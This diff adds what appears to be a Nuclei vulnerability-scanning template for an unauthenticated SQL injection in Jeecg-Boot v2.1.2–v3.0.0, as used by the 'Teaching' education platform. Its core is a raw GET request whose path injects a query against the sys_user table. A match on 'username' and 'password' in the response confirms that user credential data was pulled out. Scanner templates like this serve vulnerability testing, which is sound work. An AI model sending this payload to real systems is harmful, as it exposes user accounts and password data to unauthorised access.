@@ -1,0 +1,23 @@
+id: teaching-getdictItemsbytable-sqli
+
+info:
+  name: Teaching getDictItemsByTable - SQL Injection
+  author: qwtd
+  severity: high
+  description: |-
+    Jeecg-boot v2.1.2-v3.0.0 后台未授权SQL注入漏洞存在未授权注入漏洞，可以未授权构造sql语句，获取信息。
+    由于Teaching教学平台采用该版本的Jeecg-Boot开发所以受到影响。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%8A%E6%B5%B7%E9%B8%BD%E8%9B%8B%E7%BD%91%E7%BB%9C/%E6%96%B0%E5%BB%BA%20%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3.txt
+  tags: 上海鸽蛋网络-Teaching教学平台
+
+http:
+  - raw:
+      - |
+        GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user%20limit%201,2/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body,"username") && contains(body,"password")
